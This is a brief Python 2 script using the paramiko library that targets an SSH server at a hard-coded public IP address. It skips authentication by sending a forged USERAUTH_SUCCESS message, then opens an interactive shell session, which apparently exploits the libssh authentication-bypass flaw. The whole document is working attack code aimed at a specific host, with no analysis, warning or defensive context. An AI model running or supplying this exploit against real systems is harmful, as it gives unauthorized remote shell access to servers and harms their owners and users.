#!/usr/bin/env python
# -*- coding: utf-8 -*-
import paramiko
import socket
import sys

nbytes = 4096
hostname = "178.254.28.188"
port = 22

sock = socket.socket()
try:
     sock.connect((hostname, port))
     # instantiate transport
     m = paramiko.message.Message()
     transport = paramiko.transport.Transport(sock)
     transport.start_client()

     m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
     transport._send_message(m)

     cmd_channel = transport.open_session()
     cmd_channel.invoke_shell()

except socket.error:
     print '[-] Connecting to host failed. Please check the specified host and port.'
     sys.exit(1)
